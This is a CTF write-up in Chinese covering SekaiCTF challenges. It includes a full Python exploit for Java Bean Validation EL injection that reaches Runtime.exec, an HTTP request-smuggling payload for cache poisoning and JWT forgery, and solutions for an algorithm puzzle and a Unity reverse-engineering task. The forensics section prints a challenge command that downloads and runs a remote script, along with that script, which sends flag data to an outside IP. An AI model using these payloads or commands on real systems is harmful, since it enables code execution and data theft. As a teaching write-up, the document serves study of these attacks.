<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sekai.app.controller.contact;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sekai.app.waf.FrogWaf;</span><br><span class="line"><span class="keyword">import</span> lombok.SneakyThrows;</span><br><span class="line"><span class="keyword">import</span> lombok.val;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.ClassPathResource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StreamUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.validation.ConstraintValidator;</span><br><span class="line"><span class="keyword">import</span> javax.validation.ConstraintValidatorContext;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.AccessDeniedException;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CountryValidator</span> <span class="keyword">implements</span> <span class="title class_">ConstraintValidator</span>&lt;CheckCountry, String&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SneakyThrows</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValid</span><span class="params">(<span class="keyword">final</span> String input, <span class="keyword">final</span> ConstraintValidatorContext constraintContext)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">val</span> <span class="variable">v</span> <span class="operator">=</span> FrogWaf.getViolationByString(input);</span><br><span class="line">        <span class="keyword">if</span> (v.isPresent()) &#123;</span><br><span class="line">            <span class="type">val</span> <span class="variable">msg</span> <span class="operator">=</span> String.format(<span class="string">&quot;Malicious input found: %s&quot;</span>, v);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AccessDeniedException</span>(msg);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">val</span> <span class="variable">countries</span> <span class="operator">=</span> StreamUtils.copyToString(<span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;countries&quot;</span>).getInputStream(), Charset.defaultCharset()).split(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="type">val</span> <span class="variable">isValid</span> <span class="operator">=</span> Arrays.asList(countries).contains(input);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!isValid) &#123;</span><br><span class="line">            <span class="type">val</span> <span class="variable">message</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s is not a valid country&quot;</span>, input);</span><br><span class="line">            constraintContext.disableDefaultConstraintViolation();</span><br><span class="line">            constraintContext.buildConstraintViolationWithTemplate(message)</span><br><span class="line">                    .addConstraintViolation();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> isValid;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">constraintContext.disableDefaultConstraintViolation();</span><br><span class="line">constraintContext.buildConstraintViolationWithTemplate(message).addConstraintViolation();</span><br></pre></td></tr></table></figure>
<p>存在EL表达式的注入</p>
<p><a href="https://codeql.github.com/codeql-query-help/java/java-insecure-bean-validation/">https://codeql.github.com/codeql-query-help/java/java-insecure-bean-validation/</a></p>
<h4 id="任意数字构造"><a href="#任意数字构造" class="headerlink" title="任意数字构造"></a>任意数字构造</h4><p>对于这一题，需要就是进行EL表达式的构造，可以通过其他的方式进行任意字符的构造，首先是数字</p>
<p>（转载大佬脚本）</p>
<p>因为存在message，所以构造思路上就是使用equal</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">message.equals(message)</span><br></pre></td></tr></table></figure>
<p>相等之后返回1，然后使用compareTo，相当于1.compareTo(1)，返回0</p>
<p>同理0的构造就是将1.compareTo(1)变为1.compareTo(0)，</p>
<p>也就构造出了<code>message.equals(message.hashCode())</code>，这句话会返回0</p>
<p>构造出0和1之后就需要考虑如何构造出任意数字</p>
<p>前置：</p>
<p><code>message.length()</code>返回的是一个Integer，然后在这个类下面存在sum函数，就可以使用不断的嵌套进行对1的累加。</p>
<p>相当于</p>
<p><code>1+(1+(1+1))</code>如此不断重复</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_int</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;message.equals(message).compareTo(message.equals(message))&quot;</span></span><br><span class="line">    target = i</span><br><span class="line"></span><br><span class="line">    one = <span class="string">&quot;message.equals(message).compareTo(message.equals(message.hashCode()))&quot;</span></span><br><span class="line">    curr = one</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(target - <span class="number">1</span>):</span><br><span class="line">        curr = <span class="string">f&quot;message.length().sum(<span class="subst">&#123;one&#125;</span>, <span class="subst">&#123;curr&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> curr</span><br></pre></td></tr></table></figure>
<h4 id="任意字符构造"><a href="#任意字符构造" class="headerlink" title="任意字符构造"></a>任意字符构造</h4><p>对于这个任意字符构造，使用的是反射机制，在此就不多解释了</p>
<p>第一步找到需要的函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">50</span>)</span>:</span><br><span class="line"></span><br><span class="line">    ii = get_int(i)</span><br><span class="line">    r = requests.post(<span class="string">&quot;http://127.0.0.1:1337/addContact&quot;</span>, json=&#123;</span><br><span class="line">        <span class="string">&quot;firstName&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;lastName&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;description&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">        <span class="string">&quot;country&quot;</span>: f<span class="string">&quot;$&#123;&#123;message.getClass().getMethods()[&#123;ii&#125;]&#125;&#125;&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    print(r.text,i)</span><br></pre></td></tr></table></figure>
<p>然后所需要构造的链子是<code>String.charAt(0).toChars(i)[0].toString()</code>，第一个函数的调用返回一个char类型，其类为Character，然后通过反射调用其存在的方法<code>toChars</code>，然后就可以调用ascii码进行任意字符的构造了，需要加上toString将其转为字符串。因为时候方法的构造需要</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_chr</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="comment"># charAt - 22</span></span><br><span class="line">    <span class="comment"># toChars - 39</span></span><br><span class="line">    <span class="comment"># String.charAt(0).toChars(i)[0].toString()</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;message.getClass().getMethods()[<span class="subst">&#123;get_int(<span class="number">22</span>)&#125;</span>].invoke(message, <span class="subst">&#123;get_int(<span class="number">0</span>)&#125;</span>).getClass().getMethods()[<span class="subst">&#123;get_int(<span class="number">39</span>)&#125;</span>].invoke(message,<span class="subst">&#123;get_int(i)&#125;</span>)[<span class="subst">&#123;get_int(<span class="number">0</span>)&#125;</span>].toString()&quot;</span></span><br></pre></td></tr></table></figure>
<p>最后获得任意字符串的构造</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">def <span class="title function_">get_str</span><span class="params">(s)</span>:</span><br><span class="line">    res = get_chr(ord(s[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">1</span>, len(s)</span>):</span><br><span class="line">        res += f<span class="string">&quot;.concat(&#123;get_chr(ord(s[i]))&#125;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
<h4 id="任意方法构造"><a href="#任意方法构造" class="headerlink" title="任意方法构造"></a>任意方法构造</h4><p>同样的，通过反射获取方法然后进行构造</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">message.getClass().getClass().getMethods()[&#123;get_int(<span class="number">2</span>)&#125;].invoke(message, &#123;get_str(s)&#125;)message.getClass().getClass()</span><br></pre></td></tr></table></figure>
<p>获取Class类，然后getMethod，获取forName然后，然后调用invoke得到相应的类即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_class</span>(<span class="params">s</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;message.getClass().getClass().getMethods()[<span class="subst">&#123;get_int(<span class="number">2</span>)&#125;</span>].invoke(message, <span class="subst">&#123;get_str(s)&#125;</span>)&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>最后我更改了一下整个的payload，不然有点难以理解，不如直接使用<code>.getInputStream().readAllBytes()[i]</code>截取字符即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    cmd = <span class="string">&quot;cat flag-f3d5d1137dc6a727ce3dfcfc45d163f5.txt&quot;</span></span><br><span class="line">    <span class="comment"># cmd = &quot;ls&quot;</span></span><br><span class="line">    r = requests.post(<span class="string">&quot;http://127.0.0.1:1337/addContact&quot;</span>, json=&#123;</span><br><span class="line">        <span class="string">&quot;firstName&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;lastName&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;description&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">        <span class="string">&quot;country&quot;</span>: <span class="string">f&quot;$&#123;&#123;<span class="subst">&#123;get_class(<span class="string">&#x27;java.lang.Runtime&#x27;</span>)&#125;</span>.getMethods()[<span class="subst">&#123;get_int(<span class="number">6</span>)&#125;</span>].invoke(null).exec(<span class="subst">&#123;get_str(cmd)&#125;</span>).getInputStream().readAllBytes()[<span class="subst">&#123;get_int(i)&#125;</span>]&#125;&#125;&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    data = r.json()</span><br><span class="line">    violations = data[<span class="string">&#x27;violations&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> violations:</span><br><span class="line">        <span class="keyword">if</span> v[<span class="string">&#x27;fieldName&#x27;</span>] == <span class="string">&#x27;country&#x27;</span>:</span><br><span class="line">            res += <span class="built_in">chr</span>(<span class="built_in">int</span>(v[<span class="string">&#x27;message&#x27;</span>].strip(<span class="string">&quot; is not a valid country&quot;</span>)))</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<p>最终exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_int</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;message.equals(message).compareTo(message.equals(message))&quot;</span></span><br><span class="line"></span><br><span class="line">    target = i</span><br><span class="line"></span><br><span class="line">    one = <span class="string">&quot;message.equals(message).compareTo(message.equals(message.hashCode()))&quot;</span></span><br><span class="line">    curr = one</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(target - <span class="number">1</span>):</span><br><span class="line">        curr = <span class="string">f&quot;message.length().sum(<span class="subst">&#123;one&#125;</span>, <span class="subst">&#123;curr&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> curr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_chr</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="comment"># charAt - 22</span></span><br><span class="line">    <span class="comment"># toChars - 39</span></span><br><span class="line">    <span class="comment"># String.charAt(0).toChars(i)[0].toString()</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;message.getClass().getMethods()[<span class="subst">&#123;get_int(<span class="number">22</span>)&#125;</span>].invoke(message, <span class="subst">&#123;get_int(<span class="number">0</span>)&#125;</span>).getClass().getMethods()[<span class="subst">&#123;get_int(<span class="number">39</span>)&#125;</span>].invoke(message,<span class="subst">&#123;get_int(i)&#125;</span>)[<span class="subst">&#123;get_int(<span class="number">0</span>)&#125;</span>].toString()&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_str</span>(<span class="params">s</span>):</span><br><span class="line">    res = get_chr(<span class="built_in">ord</span>(s[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(s)):</span><br><span class="line">        res += <span class="string">f&quot;.concat(<span class="subst">&#123;get_chr(<span class="built_in">ord</span>(s[i]))&#125;</span>)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_class</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="comment"># forName: 2</span></span><br><span class="line">    <span class="comment"># Class.forName(s)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;message.getClass().getClass().getMethods()[<span class="subst">&#123;get_int(<span class="number">2</span>)&#125;</span>].invoke(message, <span class="subst">&#123;get_str(s)&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    cmd = <span class="string">&quot;cat flag-f3d5d1137dc6a727ce3dfcfc45d163f5.txt&quot;</span></span><br><span class="line">    <span class="comment"># cmd = &quot;ls&quot;</span></span><br><span class="line">    r = requests.post(<span class="string">&quot;http://127.0.0.1:1337/addContact&quot;</span>, json=&#123;</span><br><span class="line">        <span class="string">&quot;firstName&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;lastName&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;description&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">        <span class="string">&quot;country&quot;</span>: <span class="string">f&quot;$&#123;&#123;<span class="subst">&#123;get_class(<span class="string">&#x27;java.lang.Runtime&#x27;</span>)&#125;</span>.getMethods()[<span class="subst">&#123;get_int(<span class="number">6</span>)&#125;</span>].invoke(null).exec(<span class="subst">&#123;get_str(cmd)&#125;</span>).getInputStream().readAllBytes()[<span class="subst">&#123;get_int(i)&#125;</span>]&#125;&#125;&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    data = r.json()</span><br><span class="line">    violations = data[<span class="string">&#x27;violations&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> violations:</span><br><span class="line">        <span class="keyword">if</span> v[<span class="string">&#x27;fieldName&#x27;</span>] == <span class="string">&#x27;country&#x27;</span>:</span><br><span class="line">            res += <span class="built_in">chr</span>(<span class="built_in">int</span>(v[<span class="string">&#x27;message&#x27;</span>].strip(<span class="string">&quot; is not a valid country&quot;</span>)))</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<h3 id="chunky"><a href="#chunky" class="headerlink" title="chunky"></a>chunky</h3><p>这题的话，大概的意思就是通过请求走私对缓存进行污染，首先就是先生成需要污染的密钥，然后通过缓存机制将key缓存到缓存端，然后通过缓存和后端服务器处理的不同然后伪造jwt获得admin</p>
<p>ps：主要是go语言写的web服务，没看懂,所以只会重点学一下原理</p>
<p>缓存服务在nginx中</p>
<p>后端服务在python的逻辑中</p>
<p>docker中设置环境变量<code>JWKS_URL_TEMPLATE=http://chunky.chals.sekai.team:8080/&#123;user_id&#125;/.well-known/jwks.json</code></p>
<p>admin.py中有get_public_key_url，引用了上面的url，并且存在下面的逻辑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">authorize_request</span>(<span class="params">token, user_id</span>):</span><br><span class="line">    pubkey_url = get_public_key_url(user_id)</span><br><span class="line">    <span class="keyword">if</span> has_valid_alg(token) <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(</span><br><span class="line">            <span class="string">&quot;Invalid algorithm. Only &#123;valid_algo&#125; allowed!&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                valid_algo=valid_algo</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    pubkey = get_public_key(pubkey_url)</span><br><span class="line">    <span class="built_in">print</span>(pubkey, flush=<span class="literal">True</span>)</span><br><span class="line">    pubkey = <span class="string">&quot;-----BEGIN PUBLIC KEY-----\n&#123;pubkey&#125;\n-----END PUBLIC KEY-----&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        pubkey=pubkey</span><br><span class="line">    ).encode()</span><br><span class="line">    decoded_token = jwt.decode(token, pubkey, algorithms=[<span class="string">&quot;RS256&quot;</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;user&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> decoded_token:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;user claim missing!&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> decoded_token[<span class="string">&quot;user&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>对jwt进行解码判断是否是admin</p>
<p>cache.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;sync&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Cache <span class="keyword">struct</span> &#123;</span><br><span class="line">	data  <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span></span><br><span class="line">	mutex sync.RWMutex</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Cache)</span></span> Get(key <span class="type">string</span>) (<span class="type">string</span>, <span class="type">bool</span>) &#123;</span><br><span class="line">	c.mutex.Lock()</span><br><span class="line">	value, ok := c.data[key]</span><br><span class="line">	c.mutex.Unlock()</span><br><span class="line">	<span class="keyword">return</span> value, ok</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Cache)</span></span> Set(key, value <span class="type">string</span>) &#123;</span><br><span class="line">	c.mutex.Lock()</span><br><span class="line">	c.data[key] = value</span><br><span class="line">	c.mutex.Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Cache)</span></span> Clear() &#123;</span><br><span class="line">	c.mutex.Lock()</span><br><span class="line">	<span class="keyword">for</span> k := <span class="keyword">range</span> c.data &#123;</span><br><span class="line">		<span class="built_in">delete</span>(c.data, k)</span><br><span class="line">	&#125;</span><br><span class="line">	c.mutex.Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>存在set方法将传入的数值存储，rcache.go存在部分黑名单，直接小写绕过就行了，并且使用了🔒防止了多线程的问题</p>
<p>最终的做法就是构造一篇blog，将我们伪造的key放入title，获取user_id和post_id，然后通过go语言对缓存服务器以及后端服务器对报文的不同处理方式实现的逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /9HGPZXRCK426RTH38XTDWD3FHWLE76EH HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">transfer-encoding: chunked</span><br><span class="line">Content-Length: 99</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post/d4fea7be-41b0-42f5-a1f5-8ed6830bfec7/0c201b0a-fe61-4a87-83ea-2a8cd18bb0a0 HTTP/1.1</span><br><span class="line">GET /d4fea7be-41b0-42f5-a1f5-8ed6830bfec7/.well-known/jwks.json HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br></pre></td></tr></table></figure>
<p>缓存服务会认为申请的是<code>/d4fea7be-41b0-42f5-a1f5-8ed6830bfec7/.well-known/jwks.json</code>，因为根据的是Content-Length</p>
<p>真正的后端服务会认为是<code>/post/d4fea7be-41b0-42f5-a1f5-8ed6830bfec7/0c201b0a-fe61-4a87-83ea-2a8cd18bb0a0 HTTP/1.1</code>，因为根据的是transfer-encoding: chunked，所以在同时申请这样的报文状态下面，会将后端服务申请得到的东西存储到<code>/d4fea7be-41b0-42f5-a1f5-8ed6830bfec7/.well-known/jwks.json</code>下面，访问user_public_key的url会发现是我们伪造的key，也就实现了缓存污染（但是实际产生的原因还要等到我学go之后再说，不过我猜测就是在访问的过程中执行了Get和Set的方法，和不同的判定方式然后导致了错误的缓存方式（就是http走私的原理），以及跟进程锁有关系，会将之前未放入的报文进行拼接，然后导致不同url之间的污染问题），也就是说申请的数据是后端服务器的，但是存储的地方是缓存服务器。</p>
<p>后端逻辑根据chunked传输，遇到<code>\r\n</code>会停止，这就是为什么会识别成第一个</p>
<p>这题考的还是报文的处理问题，算是我第一次玩，而且还是go语言，具体逻辑还是没完全看懂</p>
<p>具体的解题脚本看官方文档就可</p>
<h3 id="余下两题待定（不会X，后续要学一下）"><a href="#余下两题待定（不会X，后续要学一下）" class="headerlink" title="余下两题待定（不会X，后续要学一下）"></a>余下两题待定（不会X，后续要学一下）</h3><h2 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h2><h3 id="wiki-game"><a href="#wiki-game" class="headerlink" title="wiki_game"></a>wiki_game</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dijkstra</span>(<span class="params">graph, start, end</span>):</span><br><span class="line">    distances = &#123;vertex: <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>) <span class="keyword">for</span> vertex <span class="keyword">in</span> graph&#125;</span><br><span class="line">    distances[start] = <span class="number">0</span></span><br><span class="line">    priority_queue = [(<span class="number">0</span>, start)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> priority_queue:</span><br><span class="line">        current_distance, current_vertex = heapq.heappop(priority_queue)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current_distance &gt; distances[current_vertex]:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> neighbor <span class="keyword">in</span> graph[current_vertex]:</span><br><span class="line">            distance = current_distance + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> distance &lt; distances[neighbor]:</span><br><span class="line">                distances[neighbor] = distance</span><br><span class="line">                heapq.heappush(priority_queue, (distance, neighbor))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> distances[end]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取输入</span></span><br><span class="line">L = <span class="built_in">int</span>(<span class="built_in">input</span>().strip())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L):</span><br><span class="line">    n, m = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">    graph = &#123;i: [] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, n)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        u, v = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">        graph[u].append(v)</span><br><span class="line"></span><br><span class="line">    start, end = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 调用 Dijkstra 算法</span></span><br><span class="line">    shortest_distance = dijkstra(graph, start, end)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出结果</span></span><br><span class="line">    <span class="keyword">if</span> shortest_distance &lt;= <span class="number">6</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;YES&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;NO&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Azusawa’s-Gacha-World"><a href="#Azusawa’s-Gacha-World" class="headerlink" title="Azusawa’s Gacha World"></a>Azusawa’s Gacha World</h3><p>Unity游戏，直接AssetStudio游戏解包一把梭哈</p>
<p>在解包的Sprite下找到flag.png</p>
<p><img src="/img/flag.png" alt="flag"></p>
<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="Eval-Me"><a href="#Eval-Me" class="headerlink" title="Eval Me"></a>Eval Me</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;chals.sekai.team&quot;</span>, <span class="number">9000</span>,level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r.recvline()</span><br><span class="line">    s = r.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    res = <span class="built_in">str</span>(<span class="built_in">eval</span>(s[<span class="number">0</span>].decode()))</span><br><span class="line">    r.sendline(res.encode())</span><br></pre></td></tr></table></figure>
<p>然后给了一句话</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).check_output(<span class="string">&quot;(curl -sL https://shorturl.at/fgjvU -o extract.sh &amp;&amp; chmod +x extract.sh &amp;&amp; bash extract.sh &amp;&amp; rm -f extract.sh)&gt;/dev/null 2&gt;&amp;1||true&quot;</span>,shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>把他下载下来</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">FLAG=$(cat flag.txt)</span><br><span class="line"></span><br><span class="line">KEY=&#x27;s3k@1_v3ry_w0w&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Credit: https://gist.github.com/kaloprominat/8b30cda1c163038e587cee3106547a46</span></span><br><span class="line">Asc() &#123; printf &#x27;%d&#x27; &quot;&#x27;$1&quot;; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XOREncrypt()&#123;</span><br><span class="line">    local key=&quot;$1&quot; DataIn=&quot;$2&quot;</span><br><span class="line">    local ptr DataOut val1 val2 val3</span><br><span class="line"></span><br><span class="line">    for (( ptr=0; ptr &lt; $&#123;#DataIn&#125;; ptr++ )); do</span><br><span class="line"></span><br><span class="line">        val1=$( Asc &quot;$&#123;DataIn:$ptr:1&#125;&quot; )</span><br><span class="line">        val2=$( Asc &quot;$&#123;key:$(( ptr % $&#123;#key&#125; )):1&#125;&quot; )</span><br><span class="line"></span><br><span class="line">        val3=$(( val1 ^ val2 ))</span><br><span class="line"></span><br><span class="line">        DataOut+=$(printf &#x27;%02x&#x27; &quot;$val3&quot;)</span><br><span class="line"></span><br><span class="line">    done</span><br><span class="line"></span><br><span class="line">    for ((i=0;i&lt;$&#123;#DataOut&#125;;i+=2)); do</span><br><span class="line">    BYTE=$&#123;DataOut:$i:2&#125;</span><br><span class="line">    curl -m 0.5 -X POST -H &quot;Content-Type: application/json&quot; -d &quot;&#123;\&quot;data\&quot;:\&quot;$BYTE\&quot;&#125;&quot; http://35.196.65.151:30899/ &amp;&gt;/dev/null</span><br><span class="line">    done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">XOREncrypt $KEY $FLAG</span><br><span class="line"></span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
<p>就是简单的异或逻辑，给了流量包，把data提取出来</p>
